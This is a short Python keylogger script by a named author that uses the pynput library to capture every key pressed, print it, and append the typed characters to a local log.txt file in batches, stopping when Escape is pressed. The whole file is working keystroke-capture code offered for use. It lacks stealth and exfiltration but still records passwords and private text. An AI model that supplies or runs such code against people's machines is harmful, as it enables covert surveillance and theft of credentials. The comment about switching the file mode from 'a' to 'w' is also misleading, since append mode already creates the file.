#A basic keylogger program by Atharv Swarge
#This keylogger program helps to capture characters that you type on your keyboard.

import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

#To capture keys
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1 
    print("{0} pressed".format(key))

    if count >= 10000:
        count = 0
        write_file(keys)
        keys = []

#To capture keys in a log text file
def write_file(keys):
    with open("log.txt", "a") as f: #For the first time to create a log file, replace 'a' with 'w'. After the file is created, rename 'w' to 'a'.
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#To avoid key capturing problems
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener: 
    listener.join()